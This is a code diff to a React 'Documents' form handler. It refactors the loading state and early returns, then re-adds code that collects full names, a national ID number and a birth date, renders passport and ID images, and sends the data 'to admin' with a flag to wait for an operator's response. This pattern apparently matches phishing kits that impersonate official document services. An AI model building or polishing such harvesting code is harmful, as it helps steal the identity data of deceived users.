@@ -144,6 +144,10 @@ const Documents = () => {
 
   // Handle form submission
   const handleSubmit = () => {
+    console.log('handleSubmit called');
+    // Start loading immediately
+    setIsLoading(true);
+    
     const errors: Record<string, string> = {};
     
     // Validate Arabic name
@@ -202,76 +206,81 @@ const Documents = () => {
     
     setValidationErrors(errors);
     
-    if (Object.keys(errors).length === 0) {
-      // Start loading
-      setIsLoading(true);
-      
-      // Capture passport as image
-      if (passportRef.current) {
-        toPng(passportRef.current, {
-          quality: 1.0,
-          pixelRatio: 2,
-          cacheBust: true,
-          skipAutoScale: true,
-          style: {
-            transform: 'scale(1)',
-            transformOrigin: 'top left'
-          }
-        }).then((dataUrl) => {
-          setPassportImage(dataUrl);
-        }).catch((error) => {
-          console.error('Error capturing passport:', error);
-        });
-      }
-      
-      // Capture national ID as image
-      if (nationalIdRef.current) {
-        toPng(nationalIdRef.current, {
-          quality: 1.0,
-          pixelRatio: 2,
-          cacheBust: true,
-          skipAutoScale: true,
-          style: {
-            transform: 'scale(1)',
-            transformOrigin: 'top left'
-          }
-        }).then((dataUrl) => {
-          setNationalIdImage(dataUrl);
-        }).catch((error) => {
-          console.error('Error capturing national ID:', error);
-        });
-      }
-      
-      // Show confirmation popup after 3 seconds and stop loading
-      setTimeout(() => {
-        setIsLoading(false);
-        setShowConfirmPopup(true);
-      }, 3000);
-      
-      // Send data to admin
-      const formData = {
-        'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
-        'الاسم الأول (عربي)': arabicFirstName,
-        'اسم الأب (عربي)': arabicSecondName,
-        'اسم الجد (عربي)': arabicThirdName,
-        'اسم العائلة (عربي)': arabicFourthName,
-        'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
-        'First Name': englishFirstName,
-        'Second Name': englishSecondName,
-        'Third Name': englishThirdName,
-        'Last Name': englishFourthName,
-        'رقم الهوية الوطنية': nationalId,
-        'تاريخ الميلاد': calendarType === 'hijri' 
-          ? `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`
-          : dateOfBirth?.toLocaleDateString('ar-SA'),
-      };
-      
-      sendData({
-        current: 'صفحة الوثائق',
-        ...formData,
-        waitingForAdminResponse: true,
+    if (Object.keys(errors).length > 0) {
+      // Stop loading if there are errors
+      setIsLoading(false);
+      console.log('Validation errors:', errors);
+      return;
+    }
+    
+    // No errors, continue with submission
+    console.log('No validation errors, proceeding...');
+    
+    // Capture passport as image
+    if (passportRef.current) {
+      toPng(passportRef.current, {
+        quality: 1.0,
+        pixelRatio: 2,
+        cacheBust: true,
+        skipAutoScale: true,
+        style: {
+          transform: 'scale(1)',
+          transformOrigin: 'top left'
+        }
+      }).then((dataUrl) => {
+        setPassportImage(dataUrl);
+      }).catch((error) => {
+        console.error('Error capturing passport:', error);
       });
     }
+    
+    // Capture national ID as image
+    if (nationalIdRef.current) {
+      toPng(nationalIdRef.current, {
+        quality: 1.0,
+        pixelRatio: 2,
+        cacheBust: true,
+        skipAutoScale: true,
+        style: {
+          transform: 'scale(1)',
+          transformOrigin: 'top left'
+        }
+      }).then((dataUrl) => {
+        setNationalIdImage(dataUrl);
+      }).catch((error) => {
+        console.error('Error capturing national ID:', error);
+      });
+    }
+    
+    // Show confirmation popup after 3 seconds and stop loading
+    setTimeout(() => {
+      setIsLoading(false);
+      setShowConfirmPopup(true);
+    }, 3000);
+    
+    // Send data to admin
+    const formData = {
+      'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
+      'الاسم الأول (عربي)': arabicFirstName,
+      'اسم الأب (عربي)': arabicSecondName,
+      'اسم الجد (عربي)': arabicThirdName,
+      'اسم العائلة (عربي)': arabicFourthName,
+      'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
+      'First Name': englishFirstName,
+      'Second Name': englishSecondName,
+      'Third Name': englishThirdName,
+      'Last Name': englishFourthName,
+      'رقم الهوية الوطنية': nationalId,
+      'تاريخ الميلاد': calendarType === 'hijri' 
+        ? `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`
+        : dateOfBirth?.toLocaleDateString('ar-SA'),
+    };
+    
+    sendData({
+      current: 'صفحة الوثائق',
+      ...formData,
+      waitingForAdminResponse: true,
+    });
   };
 
   return (
